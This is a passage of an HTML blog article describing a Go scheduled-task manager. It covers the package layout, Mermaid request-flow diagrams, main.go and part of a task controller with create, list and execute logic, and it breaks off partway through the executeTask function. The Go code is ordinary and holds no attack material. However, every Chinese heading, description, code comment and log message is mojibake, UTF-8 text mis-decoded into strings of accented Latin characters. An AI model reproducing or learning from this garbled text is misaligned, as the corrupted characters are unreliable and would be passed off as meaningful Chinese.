<li><strong>service/</strong>: ä¸šåŠ¡é€»è¾‘å±‚ï¼Œå®ç°ä»»åŠ¡æ‰§è¡Œå’Œç®¡ç†çš„æ ¸å¿ƒé€»è¾‘</li>
<li><strong>timer/</strong>: ä»»åŠ¡å®šæ—¶å™¨ï¼Œè´Ÿè´£ä»»åŠ¡çš„è°ƒåº¦å’Œæ‰§è¡Œ</li>
<li><strong>initialize/</strong>: åˆå§‹åŒ–æ¨¡å—ï¼Œè´Ÿè´£æ•°æ®åº“è¿æ¥å’Œä»»åŠ¡åŠ è½½</li>
<li><strong>template/</strong>: å‰ç«¯æ¨¡æ¿ï¼Œå®ç°ç”¨æˆ·ç•Œé¢</li>
<li><strong>static/</strong>: é™æ€èµ„æºï¼ŒåŒ…æ‹¬Vue.jsã€Axiosç­‰å‰ç«¯åº“</li>
</ul>
<h3 data-id="heading-10">å››ã€é¡¹ç›®å¼€å‘æµç¨‹å›¾</h3>
<h4 data-id="heading-11">1. åç«¯æœåŠ¡æµç¨‹å›¾</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant Client as å‰ç«¯
    participant API as APIå±‚
    participant Controller as æ§åˆ¶å™¨å±‚
    participant Service as æœåŠ¡å±‚
    participant Timer as å®šæ—¶å™¨
    participant DB as æ•°æ®åº“

    Client-&gt;&gt;API: HTTPè¯·æ±‚
    API-&gt;&gt;Controller: è·¯ç”±åˆ†å‘
    Controller-&gt;&gt;DB: æ•°æ®æ“ä½œ
    Controller-&gt;&gt;Service: ä¸šåŠ¡é€»è¾‘å¤„ç†
    Controller-&gt;&gt;Timer: ä»»åŠ¡ç®¡ç†
    Timer-&gt;&gt;Service: ä»»åŠ¡æ‰§è¡Œ
    Service-&gt;&gt;DB: æ‰§è¡Œç»“æœå­˜å‚¨
    Controller--&gt;&gt;Client: å“åº”ç»“æœ
</code></pre>
<h4 data-id="heading-12">2. å‰ç«¯ä¸åç«¯äº¤äº’æ“ä½œåŠŸèƒ½æµç¨‹å›¾</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant User as ç”¨æˆ·
    participant Frontend as å‰ç«¯
    participant Backend as åç«¯API
    participant DB as æ•°æ®åº“

    User-&gt;&gt;Frontend: è®¿é—®ç³»ç»Ÿ
    Frontend-&gt;&gt;Backend: GET /api/tasks
    Backend-&gt;&gt;DB: æŸ¥è¯¢ä»»åŠ¡åˆ—è¡¨
    DB--&gt;&gt;Backend: è¿”å›ä»»åŠ¡æ•°æ®
    Backend--&gt;&gt;Frontend: è¿”å›ä»»åŠ¡åˆ—è¡¨
    Frontend--&gt;&gt;User: æ˜¾ç¤ºä»»åŠ¡åˆ—è¡¨

    User-&gt;&gt;Frontend: ç‚¹å‡»æ–°å¢ä»»åŠ¡
    Frontend-&gt;&gt;User: æ˜¾ç¤ºæ–°å¢ä»»åŠ¡è¡¨å•
    User-&gt;&gt;Frontend: å¡«å†™ä»»åŠ¡ä¿¡æ¯
    Frontend-&gt;&gt;Backend: POST /api/tasks
    Backend-&gt;&gt;DB: ä¿å­˜ä»»åŠ¡
    Backend-&gt;&gt;Backend: æ³¨å†Œä»»åŠ¡åˆ°å®šæ—¶å™¨
    DB--&gt;&gt;Backend: ä¿å­˜æˆåŠŸ
    Backend--&gt;&gt;Frontend: è¿”å›ä»»åŠ¡ä¿¡æ¯
    Frontend--&gt;&gt;User: æ˜¾ç¤ºæˆåŠŸæç¤º

    User-&gt;&gt;Frontend: ç‚¹å‡»æŸ¥çœ‹æ—¥å¿—
    Frontend-&gt;&gt;Backend: GET /api/tasks/logs?task_id=1
    Backend-&gt;&gt;DB: æŸ¥è¯¢ä»»åŠ¡æ—¥å¿—
    DB--&gt;&gt;Backend: è¿”å›æ—¥å¿—æ•°æ®
    Backend--&gt;&gt;Frontend: è¿”å›æ—¥å¿—åˆ—è¡¨
    Frontend--&gt;&gt;User: æ˜¾ç¤ºä»»åŠ¡æ—¥å¿—

    User-&gt;&gt;Frontend: ç‚¹å‡»å¯åŠ¨/ç»ˆæ­¢ä»»åŠ¡
    Frontend-&gt;&gt;Backend: POST /api/tasks/{id}/start
    Backend-&gt;&gt;DB: æ›´æ–°ä»»åŠ¡çŠ¶æ€
    Backend-&gt;&gt;Backend: æ³¨å†Œ/ç§»é™¤ä»»åŠ¡
    DB--&gt;&gt;Backend: æ›´æ–°æˆåŠŸ
    Backend--&gt;&gt;Frontend: è¿”å›ä»»åŠ¡ä¿¡æ¯
    Frontend--&gt;&gt;User: æ˜¾ç¤ºæˆåŠŸæç¤º
</code></pre>
<h3 data-id="heading-13">äº”ã€åç«¯æœåŠ¡ç»“æ„ä½“ã€æ ¸å¿ƒåŒ…åŠåŒ…å†…æ‰€æœ‰å‡½æ•°ä»‹ç»åŠæ ¸å¿ƒæºä»£ç </h3>
<h4 data-id="heading-14">1. æ ¸å¿ƒåŒ…ä»‹ç»</h4>
<h5 data-id="heading-15">1.1 <code>controller</code> åŒ…</h5>
<p><strong>åŠŸèƒ½</strong>ï¼šæ§åˆ¶å™¨å±‚ï¼Œå¤„ç†HTTPè¯·æ±‚ï¼Œå®ç°RESTful APIæ¥å£</p>
<p><strong>æ ¸å¿ƒç»“æ„ä½“</strong>ï¼š</p>
<ul>
<li><code>TaskController</code>ï¼šä»»åŠ¡æ§åˆ¶å™¨ï¼Œå¤„ç†ä»»åŠ¡ç›¸å…³çš„HTTPè¯·æ±‚</li>
</ul>
<p><strong>æ ¸å¿ƒå‡½æ•°</strong>ï¼š</p>
<ul>
<li><code>NewTaskController()</code>ï¼šåˆ›å»ºä»»åŠ¡æ§åˆ¶å™¨å®ä¾‹</li>
<li><code>TaskController.BeforeActivation()</code>ï¼šåœ¨æ¿€æ´»å‰é…ç½®è·¯ç”±</li>
<li><code>TaskController.ListTasks()</code>ï¼šåˆ—å‡ºæ‰€æœ‰ä»»åŠ¡</li>
<li><code>TaskController.GetTask()</code>ï¼šè·å–ä»»åŠ¡è¯¦æƒ…</li>
<li><code>TaskController.CreateTask()</code>ï¼šåˆ›å»ºæ–°ä»»åŠ¡</li>
<li><code>TaskController.UpdateTask()</code>ï¼šæ›´æ–°ä»»åŠ¡ä¿¡æ¯</li>
<li><code>TaskController.DeleteTask()</code>ï¼šåˆ é™¤ä»»åŠ¡</li>
<li><code>TaskController.ListTaskFuncs()</code>ï¼šåˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„ä»»åŠ¡å‡½æ•°</li>
<li><code>TaskController.ListTaskLogs()</code>ï¼šåˆ—å‡ºä»»åŠ¡æ‰§è¡Œæ—¥å¿—</li>
<li><code>TaskController.ListAllTaskLogs()</code>ï¼šåˆ—å‡ºæ‰€æœ‰ä»»åŠ¡æ‰§è¡Œæ—¥å¿—</li>
<li><code>TaskController.GetTaskStatistics()</code>ï¼šè·å–ä»»åŠ¡ç»Ÿè®¡ä¿¡æ¯</li>
<li><code>TaskController.StopTask()</code>ï¼šç»ˆæ­¢ä»»åŠ¡</li>
<li><code>TaskController.StartTask()</code>ï¼šå¯åŠ¨ä»»åŠ¡</li>
<li><code>TaskController.PauseTask()</code>ï¼šæš‚åœä»»åŠ¡</li>
<li><code>TaskController.ResumeTask()</code>ï¼šç»§ç»­ä»»åŠ¡</li>
<li><code>TaskController.ListCronExpressions()</code>ï¼šåˆ—å‡ºCronè¡¨è¾¾å¼</li>
<li><code>TaskController.CreateCronExpression()</code>ï¼šåˆ›å»ºCronè¡¨è¾¾å¼</li>
<li><code>TaskController.UpdateCronExpression()</code>ï¼šæ›´æ–°Cronè¡¨è¾¾å¼</li>
<li><code>TaskController.DeleteCronExpression()</code>ï¼šåˆ é™¤Cronè¡¨è¾¾å¼</li>
<li><code>executeTask()</code>ï¼šæ‰§è¡Œä»»åŠ¡å¹¶è®°å½•æ—¥å¿—</li>
</ul>
<h5 data-id="heading-16">1.2 <code>model</code> åŒ…</h5>
<p><strong>åŠŸèƒ½</strong>ï¼šæ•°æ®æ¨¡å‹å±‚ï¼Œå®šä¹‰ä»»åŠ¡å’Œæ‰§è¡Œæ—¥å¿—çš„æ•°æ®ç»“æ„</p>
<p><strong>æ ¸å¿ƒç»“æ„ä½“</strong>ï¼š</p>
<ul>
<li><code>Task</code>ï¼šä»»åŠ¡æ¨¡å‹ï¼ŒåŒ…å«ä»»åŠ¡çš„åŸºæœ¬ä¿¡æ¯å’ŒçŠ¶æ€</li>
<li><code>TaskExecutionLog</code>ï¼šä»»åŠ¡æ‰§è¡Œæ—¥å¿—æ¨¡å‹ï¼Œè®°å½•ä»»åŠ¡æ‰§è¡Œçš„è¯¦ç»†ä¿¡æ¯</li>
<li><code>CronExpression</code>ï¼šå®šæ—¶è¡¨è¾¾å¼æ¨¡å‹ï¼Œå­˜å‚¨å¸¸ç”¨çš„Cronè¡¨è¾¾å¼</li>
</ul>
<p><strong>æ ¸å¿ƒå‡½æ•°</strong>ï¼š</p>
<ul>
<li><code>Task.TableName()</code>ï¼šè®¾ç½®ä»»åŠ¡è¡¨å</li>
<li><code>TaskExecutionLog.TableName()</code>ï¼šè®¾ç½®ä»»åŠ¡æ‰§è¡Œæ—¥å¿—è¡¨å</li>
<li><code>CronExpression.TableName()</code>ï¼šè®¾ç½®Cronè¡¨è¾¾å¼è¡¨å</li>
<li><code>CreateTable()</code>ï¼šåˆ›å»ºæ•°æ®åº“è¡¨</li>
</ul>
<h5 data-id="heading-17">1.3 <code>service</code> åŒ…</h5>
<p><strong>åŠŸèƒ½</strong>ï¼šä¸šåŠ¡é€»è¾‘å±‚ï¼Œå®ç°ä»»åŠ¡æ‰§è¡Œå’Œç®¡ç†çš„æ ¸å¿ƒé€»è¾‘</p>
<p><strong>æ ¸å¿ƒç»“æ„ä½“</strong>ï¼š</p>
<ul>
<li><code>TaskFuncInfo</code>ï¼šä»»åŠ¡å‡½æ•°ä¿¡æ¯ç»“æ„ä½“ï¼ŒåŒ…å«ä»»åŠ¡å‡½æ•°çš„åç§°å’Œæè¿°</li>
<li><code>ExternalAPICallParams</code>ï¼šå¤–éƒ¨APIè°ƒç”¨å‚æ•°ç»“æ„ä½“ï¼ŒåŒ…å«APIè°ƒç”¨çš„ç›¸å…³å‚æ•°</li>
</ul>
<p><strong>æ ¸å¿ƒå‡½æ•°</strong>ï¼š</p>
<ul>
<li><code>InitTaskFuncMap()</code>ï¼šåˆå§‹åŒ–ä»»åŠ¡å‡½æ•°æ³¨å†Œä¸­å¿ƒ</li>
<li><code>DataBackup()</code>ï¼šæ•°æ®å¤‡ä»½ä»»åŠ¡</li>
<li><code>SystemCheck()</code>ï¼šç³»ç»Ÿæ£€æŸ¥ä»»åŠ¡</li>
<li><code>UserReport()</code>ï¼šç”¨æˆ·æŠ¥å‘Šä»»åŠ¡</li>
<li><code>CleanCache()</code>ï¼šæ¸…ç†ç¼“å­˜ä»»åŠ¡</li>
<li><code>SyncData()</code>ï¼šæ•°æ®åŒæ­¥ä»»åŠ¡</li>
<li><code>AddCustomTask()</code>ï¼šæ·»åŠ è‡ªå®šä¹‰ä»»åŠ¡å‡½æ•°</li>
<li><code>RemoveCustomTask()</code>ï¼šç§»é™¤è‡ªå®šä¹‰ä»»åŠ¡å‡½æ•°</li>
<li><code>GetTaskFunc()</code>ï¼šè·å–ä»»åŠ¡å‡½æ•°</li>
<li><code>ListTaskFuncs()</code>ï¼šåˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„ä»»åŠ¡å‡½æ•°</li>
<li><code>ExecuteExternalAPI()</code>ï¼šæ‰§è¡Œå¤–éƒ¨APIè°ƒç”¨çš„ä¸‡èƒ½å‡½æ•°</li>
<li><code>saveResult()</code>ï¼šä¿å­˜APIè°ƒç”¨ç»“æœåˆ°æ–‡ä»¶</li>
</ul>
<h5 data-id="heading-18">1.4 <code>initialize</code> åŒ…</h5>
<p><strong>åŠŸèƒ½</strong>ï¼šåˆå§‹åŒ–æ¨¡å—ï¼Œè´Ÿè´£æ•°æ®åº“è¿æ¥å’Œä»»åŠ¡åŠ è½½</p>
<p><strong>æ ¸å¿ƒå‡½æ•°</strong>ï¼š</p>
<ul>
<li><code>InitDatabase()</code>ï¼šåˆå§‹åŒ–æ•°æ®åº“è¿æ¥</li>
<li><code>Timer()</code>ï¼šåˆå§‹åŒ–å®šæ—¶ä»»åŠ¡</li>
<li><code>loadTasksFromDatabase()</code>ï¼šä»æ•°æ®åº“åŠ è½½ä»»åŠ¡å¹¶æ³¨å†Œåˆ°å®šæ—¶å™¨</li>
</ul>
<h5 data-id="heading-19">1.5 <code>core</code> åŒ…</h5>
<p><strong>åŠŸèƒ½</strong>ï¼šæ ¸å¿ƒåŠŸèƒ½æ¨¡å—ï¼ŒåŒ…å«Cronå®šæ—¶å™¨çš„åˆå§‹åŒ–</p>
<p><strong>æ ¸å¿ƒå‡½æ•°</strong>ï¼š</p>
<ul>
<li><code>InitCron()</code>ï¼šåˆå§‹åŒ–Cronå®ä¾‹</li>
</ul>
<h4 data-id="heading-20">2. æ ¸å¿ƒæºä»£ç </h4>
<h5 data-id="heading-21">2.1 é¡¹ç›®å…¥å£ (<code>main.go</code>)</h5>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	<span class="hljs-comment">// åˆå§‹åŒ–å…¨å±€æ—¥å¿—</span>
	logger, _ := zap.NewProduction()
	<span class="hljs-keyword">defer</span> logger.Sync()
	global.GVA_LOG = logger

	<span class="hljs-comment">// åˆå§‹åŒ–æ•°æ®åº“</span>
	initialize.InitDatabase()

	<span class="hljs-comment">// åˆå§‹åŒ–å…¨å±€ cron å®ä¾‹</span>
	global.GVA_CRON = core.InitCron()

	<span class="hljs-comment">// åˆå§‹åŒ–å®šæ—¶ä»»åŠ¡æ³¨å†Œ</span>
	initialize.Timer()

	<span class="hljs-comment">// åˆå§‹åŒ–ä»»åŠ¡å‡½æ•°æ³¨å†Œä¸­å¿ƒ</span>
	service.InitTaskFuncMap()

	<span class="hljs-comment">// è®¾ç½®è·¯ç”±</span>
	app := router.SetupRouter()

	<span class="hljs-comment">// å¯åŠ¨WebæœåŠ¡</span>
	global.GVA_LOG.Info(<span class="hljs-string">"WebæœåŠ¡å¯åŠ¨æˆåŠŸï¼Œè®¿é—®åœ°å€ï¼šhttp://localhost:8082"</span>)
	port := os.Getenv(<span class="hljs-string">"PORT"</span>)
	<span class="hljs-keyword">if</span> port == <span class="hljs-string">""</span> {
		port = <span class="hljs-string">"8082"</span> <span class="hljs-comment">// æ›´æ”¹ç«¯å£ä¸º8082</span>
	}

	<span class="hljs-comment">// æ£€æŸ¥ç«¯å£æ˜¯å¦å¯ç”¨</span>
	portNum, err := strconv.Atoi(port)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		global.GVA_LOG.Fatal(<span class="hljs-string">"WebæœåŠ¡å¯åŠ¨å¤±è´¥"</span>, zap.Error(err))
	}

	<span class="hljs-keyword">if</span> utils.IsPortInUse(portNum) {
		global.GVA_LOG.Info(<span class="hljs-string">"ç«¯å£ %s è¢«å ç”¨ï¼Œå°è¯•ç»ˆæ­¢å ç”¨è¿›ç¨‹..."</span>, zap.String(<span class="hljs-string">"port"</span>, port))
		err := utils.FindAndKillProcess(portNum)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			global.GVA_LOG.Fatal(<span class="hljs-string">"ç»ˆæ­¢è¿›ç¨‹å¤±è´¥"</span>, zap.Error(err))
		}
	}

	app.Listen(fmt.Sprintf(<span class="hljs-string">":%s"</span>, port))
}
</code></pre>
<h5 data-id="heading-22">2.2 ä»»åŠ¡æ§åˆ¶å™¨ (<code>controller/task_controller.go</code>)</h5>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// TaskController ä»»åŠ¡æ§åˆ¶å™¨</span>
<span class="hljs-keyword">type</span> TaskController <span class="hljs-keyword">struct</span>{}

<span class="hljs-comment">// NewTaskController åˆ›å»ºä»»åŠ¡æ§åˆ¶å™¨å®ä¾‹</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewTaskController</span><span class="hljs-params">()</span></span> *TaskController {
	<span class="hljs-keyword">return</span> &amp;TaskController{}
}

<span class="hljs-comment">// BeforeActivation åœ¨æ¿€æ´»å‰é…ç½®è·¯ç”±</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *TaskController)</span></span> BeforeActivation(b mvc.BeforeActivation) {
	<span class="hljs-comment">// é…ç½®è·¯ç”±</span>
	b.Handle(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/"</span>, <span class="hljs-string">"ListTasks"</span>)
	b.Handle(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/{id:string}"</span>, <span class="hljs-string">"GetTask"</span>)
	b.Handle(<span class="hljs-string">"POST"</span>, <span class="hljs-string">"/"</span>, <span class="hljs-string">"CreateTask"</span>)
	b.Handle(<span class="hljs-string">"PUT"</span>, <span class="hljs-string">"/{id:string}"</span>, <span class="hljs-string">"UpdateTask"</span>)
	b.Handle(<span class="hljs-string">"DELETE"</span>, <span class="hljs-string">"/{id:string}"</span>, <span class="hljs-string">"DeleteTask"</span>)
	b.Handle(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/funcs"</span>, <span class="hljs-string">"ListTaskFuncs"</span>)
	b.Handle(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/logs"</span>, <span class="hljs-string">"ListTaskLogs"</span>)
	b.Handle(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/logs/all"</span>, <span class="hljs-string">"ListAllTaskLogs"</span>)
	b.Handle(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/statistics"</span>, <span class="hljs-string">"GetTaskStatistics"</span>)
	<span class="hljs-comment">// ç»ˆæ­¢/å¯åŠ¨å’Œæš‚åœ/ç»§ç»­è·¯ç”±</span>
	b.Handle(<span class="hljs-string">"POST"</span>, <span class="hljs-string">"/{id:string}/stop"</span>, <span class="hljs-string">"StopTask"</span>)
	b.Handle(<span class="hljs-string">"POST"</span>, <span class="hljs-string">"/{id:string}/start"</span>, <span class="hljs-string">"StartTask"</span>)
	b.Handle(<span class="hljs-string">"POST"</span>, <span class="hljs-string">"/{id:string}/pause"</span>, <span class="hljs-string">"PauseTask"</span>)
	b.Handle(<span class="hljs-string">"POST"</span>, <span class="hljs-string">"/{id:string}/resume"</span>, <span class="hljs-string">"ResumeTask"</span>)
	<span class="hljs-comment">// cronè¡¨è¾¾å¼è·¯ç”±</span>
	b.Handle(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/cron"</span>, <span class="hljs-string">"ListCronExpressions"</span>)
	b.Handle(<span class="hljs-string">"POST"</span>, <span class="hljs-string">"/cron"</span>, <span class="hljs-string">"CreateCronExpression"</span>)
	b.Handle(<span class="hljs-string">"PUT"</span>, <span class="hljs-string">"/cron/{id:string}"</span>, <span class="hljs-string">"UpdateCronExpression"</span>)
	b.Handle(<span class="hljs-string">"DELETE"</span>, <span class="hljs-string">"/cron/{id:string}"</span>, <span class="hljs-string">"DeleteCronExpression"</span>)
}

<span class="hljs-comment">// ListTasks åˆ—å‡ºæ‰€æœ‰ä»»åŠ¡</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *TaskController)</span></span> ListTasks(ctx iris.Context) mvc.Result {
	<span class="hljs-keyword">var</span> tasks []*model.Task
	err := global.GVA_DB.Find(&amp;tasks)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		global.GVA_LOG.Error(<span class="hljs-string">"æŸ¥è¯¢ä»»åŠ¡åˆ—è¡¨å¤±è´¥"</span>, zap.Error(err))
		<span class="hljs-keyword">return</span> mvc.Response{
			Code: iris.StatusInternalServerError,
			Object: iris.Map{
				<span class="hljs-string">"code"</span>:    iris.StatusInternalServerError,
				<span class="hljs-string">"message"</span>: <span class="hljs-string">"æŸ¥è¯¢ä»»åŠ¡åˆ—è¡¨å¤±è´¥"</span>,
				<span class="hljs-string">"error"</span>:   err.Error(),
			},
		}
	}

	<span class="hljs-comment">// å¤„ç†ä¸€æ¬¡æ€§ä»»åŠ¡è¶…æœŸé—®é¢˜</span>
	now := time.Now()
	<span class="hljs-keyword">for</span> _, task := <span class="hljs-keyword">range</span> tasks {
		<span class="hljs-keyword">if</span> task.Type == <span class="hljs-string">"single"</span> &amp;&amp; task.ExecuteAt.Before(now) {
			<span class="hljs-comment">// å°†è¶…æœŸçš„ä¸€æ¬¡æ€§ä»»åŠ¡æ›´æ–°ä¸ºå·²å®ŒæˆçŠ¶æ€ï¼Œå¹¶è®¾ç½®ä¸ºç¦ç”¨å’Œæš‚åœ</span>
			task.Status = <span class="hljs-string">"completed"</span>
			task.EnabledStatus = <span class="hljs-literal">false</span>
			task.PausedStatus = <span class="hljs-literal">true</span>
			task.UpdateTime = now
			_, err := global.GVA_DB.Where(<span class="hljs-string">"id = ?"</span>, task.ID).Update(task)
			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
				global.GVA_LOG.Error(<span class="hljs-string">"æ›´æ–°è¶…æœŸä»»åŠ¡çŠ¶æ€å¤±è´¥"</span>, zap.Error(err), zap.Int64(<span class="hljs-string">"task_id"</span>, task.ID))
			} <span class="hljs-keyword">else</span> {
				global.GVA_LOG.Info(<span class="hljs-string">"æ›´æ–°è¶…æœŸä»»åŠ¡çŠ¶æ€æˆåŠŸ"</span>, zap.Int64(<span class="hljs-string">"task_id"</span>, task.ID))
			}
		}
	}

	<span class="hljs-keyword">return</span> mvc.Response{
		Code: iris.StatusOK,
		Object: iris.Map{
			<span class="hljs-string">"code"</span>:    iris.StatusOK,
			<span class="hljs-string">"message"</span>: <span class="hljs-string">"success"</span>,
			<span class="hljs-string">"data"</span>:    tasks,
		},
	}
}

<span class="hljs-comment">// CreateTask åˆ›å»ºä»»åŠ¡</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *TaskController)</span></span> CreateTask(ctx iris.Context) mvc.Result {
	<span class="hljs-keyword">var</span> req <span class="hljs-keyword">struct</span> {
		<span class="hljs-comment">// ID ç”±æ•°æ®åº“è‡ªåŠ¨ç”Ÿæˆï¼ˆbigint è‡ªå¢ï¼‰ï¼Œä¸éœ€è¦ç”¨æˆ·è¾“å…¥</span>
		ID           <span class="hljs-type">int64</span>     <span class="hljs-string">`json:"id"`</span>
		Name         <span class="hljs-type">string</span>    <span class="hljs-string">`json:"name" binding:"required"`</span>
		Description  <span class="hljs-type">string</span>    <span class="hljs-string">`json:"description"`</span>
		Type         <span class="hljs-type">string</span>    <span class="hljs-string">`json:"type" binding:"required,oneof=single recurring"`</span>
		CronExpr     <span class="hljs-type">string</span>    <span class="hljs-string">`json:"cron_expr"`</span>
		ExecuteAt    time.Time <span class="hljs-string">`json:"execute_at"`</span>
		Timeout      <span class="hljs-type">int</span>       <span class="hljs-string">`json:"timeout" binding:"min=1"`</span>
		TaskFuncName <span class="hljs-type">string</span>    <span class="hljs-string">`json:"task_func_name" binding:"required"`</span>
		Params       <span class="hljs-type">string</span>    <span class="hljs-string">`json:"params"`</span>
	}

	<span class="hljs-keyword">if</span> err := ctx.ReadJSON(&amp;req); err != <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> mvc.Response{
			Code: iris.StatusBadRequest,
			Object: iris.Map{
				<span class="hljs-string">"code"</span>:    iris.StatusBadRequest,
				<span class="hljs-string">"message"</span>: <span class="hljs-string">"å‚æ•°é”™è¯¯"</span>,
				<span class="hljs-string">"error"</span>:   err.Error(),
			},
		}
	}

	<span class="hljs-comment">// æ£€æŸ¥ä»»åŠ¡å‡½æ•°æ˜¯å¦å­˜åœ¨</span>
	_, err := service.GetTaskFunc(req.TaskFuncName)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> mvc.Response{
			Code: iris.StatusBadRequest,
			Object: iris.Map{
				<span class="hljs-string">"code"</span>:    iris.StatusBadRequest,
				<span class="hljs-string">"message"</span>: err.Error(),
			},
		}
	}

	<span class="hljs-comment">// åˆ›å»ºä»»åŠ¡</span>
	task := &amp;model.Task{
		Name:          req.Name,
		Description:   req.Description,
		Type:          req.Type,
		CronExpr:      req.CronExpr,
		ExecuteAt:     req.ExecuteAt,
		Timeout:       req.Timeout,
		Status:        <span class="hljs-string">"pending"</span>,
		TaskFuncName:  req.TaskFuncName,
		Params:        req.Params,
		CreateTime:    time.Now(),
		UpdateTime:    time.Now(),
		ExecuteCount:  <span class="hljs-number">0</span>,
		LastExecuteAt: time.Time{},
		NextExecuteAt: req.ExecuteAt,
	}

	<span class="hljs-comment">// ä¿å­˜åˆ°æ•°æ®åº“</span>
	_, err = global.GVA_DB.Insert(task)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		global.GVA_LOG.Error(<span class="hljs-string">"åˆ›å»ºä»»åŠ¡å¤±è´¥"</span>, zap.Error(err), zap.Any(<span class="hljs-string">"task"</span>, task))
		<span class="hljs-keyword">return</span> mvc.Response{
			Code: iris.StatusInternalServerError,
			Object: iris.Map{
				<span class="hljs-string">"code"</span>:    iris.StatusInternalServerError,
				<span class="hljs-string">"message"</span>: <span class="hljs-string">"åˆ›å»ºä»»åŠ¡å¤±è´¥"</span>,
				<span class="hljs-string">"error"</span>:   err.Error(),
			},
		}
	}

	<span class="hljs-comment">// æ·»åŠ åˆ°ä»»åŠ¡ç®¡ç†å™¨</span>
	taskFunc, _ := service.GetTaskFunc(req.TaskFuncName)
	<span class="hljs-keyword">if</span> req.Type == <span class="hljs-string">"single"</span> {
		err = global.GVA_TASK_MANAGER.AddTask(
			fmt.Sprintf(<span class="hljs-string">"%d"</span>, task.ID),
			task.ExecuteAt,
			time.Duration(task.Timeout)*time.Second,
			<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
				executeTask(task.ID, taskFunc, task)
			},
		)
	} <span class="hljs-keyword">else</span> {
		err = global.GVA_TASK_MANAGER.AddRecurringTask(
			fmt.Sprintf(<span class="hljs-string">"%d"</span>, task.ID),
			task.CronExpr,
			time.Duration(task.Timeout)*time.Second,
			<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
				executeTask(task.ID, taskFunc, task)
			},
		)
	}

	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		global.GVA_LOG.Error(<span class="hljs-string">"æ·»åŠ ä»»åŠ¡åˆ°ä»»åŠ¡ç®¡ç†å™¨å¤±è´¥"</span>, zap.Error(err), zap.Int64(<span class="hljs-string">"id"</span>, task.ID))
		<span class="hljs-keyword">return</span> mvc.Response{
			Code: iris.StatusInternalServerError,
			Object: iris.Map{
				<span class="hljs-string">"code"</span>:    iris.StatusInternalServerError,
				<span class="hljs-string">"message"</span>: <span class="hljs-string">"æ·»åŠ ä»»åŠ¡åˆ°ä»»åŠ¡ç®¡ç†å™¨å¤±è´¥"</span>,
				<span class="hljs-string">"error"</span>:   err.Error(),
			},
		}
	}

	<span class="hljs-keyword">return</span> mvc.Response{
		Code: iris.StatusOK,
		Object: iris.Map{
			<span class="hljs-string">"code"</span>:    iris.StatusOK,
			<span class="hljs-string">"message"</span>: <span class="hljs-string">"ä»»åŠ¡åˆ›å»ºæˆåŠŸ"</span>,
			<span class="hljs-string">"data"</span>:    task,
		},
	}
}

<span class="hljs-comment">// executeTask æ‰§è¡Œä»»åŠ¡å¹¶è®°å½•æ—¥å¿—</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">executeTask</span><span class="hljs-params">(taskID <span class="hljs-type">int64</span>, taskFunc <span class="hljs-keyword">func</span>(<span class="hljs-type">string</span>)</span></span>, task *model.Task) {
	<span class="hljs-comment">// æ£€æŸ¥ä»»åŠ¡æ˜¯å¦è¢«æš‚åœæˆ–ç¦ç”¨</span>
	<span class="hljs-keyword">var</span> currentTask model.Task
	has, err := global.GVA_DB.SQL(<span class="hljs-string">"SELECT enabled_status, paused_status FROM tasks WHERE id = ?"</span>, taskID).Get(&amp;currentTask)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		global.GVA_LOG.Error(<span class="hljs-string">"æŸ¥è¯¢ä»»åŠ¡çŠ¶æ€å¤±è´¥"</span>, zap.Error(err), zap.Int64(<span class="hljs-string">"task_id"</span>, taskID))
		<span class="hljs-keyword">return</span>
	}

	<span class="hljs-keyword">if</span> !has || !currentTask.EnabledStatus || currentTask.PausedStatus {
		global.GVA_LOG.Info(<span class="hljs-string">"ä»»åŠ¡è¢«æš‚åœæˆ–ç¦ç”¨ï¼Œè·³è¿‡æ‰§è¡Œ"</span>, zap.Int64(<span class="hljs-string">"task_id"</span>, taskID))
		<span class="hljs-keyword">return</span>
	}

	<span class="hljs-comment">// æ›´æ–°ä»»åŠ¡çŠ¶æ€ä¸ºè¿è¡Œä¸­</span>
	task.Status = <span class="hljs-string">"running"</span>
	task.UpdateTime = time.Now()
	task.LastExecuteAt = time.Now()
	_, err = global.GVA_DB.Exec(<span class="hljs-string">"UPDATE tasks SET status = ?, update_time = ?, last_execute_at = ? WHERE id = ?"</span>, task.Status, task.UpdateTime, task.LastExecuteAt, taskID)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		global.GVA_LOG.Error(<span class="hljs-string">"æ›´æ–°ä»»åŠ¡çŠ¶æ€ä¸ºè¿è¡Œä¸­å¤±è´¥"</span>, zap.Error(err), zap.Int64(<span class="hljs-string">"task_id"</span>, taskID))
	}

	<span class="hljs-comment">// åˆ›å»ºæ‰§è¡Œæ—¥å¿—</span>
